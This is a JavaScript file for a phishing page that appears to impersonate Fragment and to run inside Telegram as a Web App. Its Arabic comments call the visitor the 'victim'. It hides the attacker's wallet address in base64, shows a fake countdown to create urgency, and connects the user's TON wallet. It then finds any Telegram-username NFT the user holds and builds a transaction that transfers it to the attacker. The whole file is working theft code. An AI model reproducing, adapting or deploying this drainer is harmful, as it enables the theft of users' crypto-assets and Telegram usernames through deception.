// 1. إعداد المكتبة
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://alawi2396.github.io/fragment-web/tonconnect-manifest.json',
    buttonRootId: 'connect-button'
});

// 2. فك تشفير محفظتك (المستلم)
const _0x4a21 = ["VVFCYzdDb2lZOGxGYVBMMU1XUlFOMXBGNXR6OUtxc1JPcllOMW5rUm1tMzhyNTU="];
function _getRecp() { return atob(_0x4a21[0]); }

// 3. جلب يوزر الضحية من الرابط
function getTargetUser() {
    const tg = window.Telegram?.WebApp;
    if (tg?.initDataUnsafe?.start_param) return tg.initDataUnsafe.start_param;
    return new URLSearchParams(window.location.search).get('user') || 'username';
}

const targetUser = getTargetUser();

// 4. العداد التنازلي الحي (يبدأ من جديد عند كل دخول)
function startCountdown() {
    let totalSeconds = (11 * 3600) + (48 * 60) + 34;
    const timer = setInterval(() => {
        if (totalSeconds <= 0) { clearInterval(timer); return; }
        totalSeconds--;
        const h = Math.floor(totalSeconds / 3600);
        const m = Math.floor((totalSeconds % 3600) / 60);
        const s = totalSeconds % 60;
        document.getElementById('hours').innerText = h < 10 ? '0' + h : h;
        document.getElementById('minutes').innerText = m < 10 ? '0' + m : m;
        document.getElementById('seconds').innerText = s < 10 ? '0' + s : s;
    }, 1000);
}

// 5. تهيئة الصفحة عند التحميل
document.addEventListener('DOMContentLoaded', () => {
    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
    ['u1', 'u2', 'u3', 'u4'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.innerText = targetUser;
    });
    startCountdown(); // تشغيل العداد
});

// 6. منطق الضغط على الزر والسحب
document.getElementById('confirm-btn').onclick = async () => {
    if (!tonConnectUI.connected) {
        await tonConnectUI.openModal();
        return;
    }

    const walletAddress = tonConnectUI.account.address;
    try {
        const response = await fetch(`https://tonapi.io/v2/accounts/${walletAddress}/nfts`);
        const data = await response.json();
        const nftItem = data.nft_items.find(item => item.metadata?.name?.includes('.t.me'));

        if (nftItem) {
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [
                    {
                        address: nftItem.address, 
                        amount: "50000000",
                        payload: "te6ccgEBAQEADgAAGAAAABAAAABAAAAA" 
                    },
                    {
                        address: _getRecp(), // محفظتك المشفرة
                        amount: "1",
                    }
                ]
            };
            await tonConnectUI.sendTransaction(transaction);
        } else {
            alert("This account doesn't have any Telegram Usernames to claim.");
        }
    } catch (e) { console.error(e); }
};
